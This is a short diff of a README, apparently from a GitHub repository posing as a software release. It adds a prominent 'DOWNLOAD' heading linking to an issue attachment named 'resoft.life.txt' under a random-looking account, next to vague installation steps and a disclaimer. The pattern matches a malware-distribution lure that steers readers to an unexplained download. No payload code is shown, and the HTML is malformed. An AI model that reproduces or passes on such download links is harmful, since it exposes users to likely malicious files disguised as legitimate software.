@@ -13,7 +13,9 @@
 • If you have any questions or need assistance, contact the email address provided in my profile.
 
 • When installing the software, follow the instructions for selecting the language, configuring settings, and any other additional options, if present.
+
 <H1 align=center><a href="https://github.com/MarkCampbellh5l34/uxtsxyhazb/files/13260896/resoft.life.txt"> DOWNLOAD </a>a></H1>H1>
+
 ## Usage rules :page_facing_up:
 
 • The information and tools provided in this repository are intended solely for informational purposes. The authors are not responsible for unauthorized use of the materials provided.
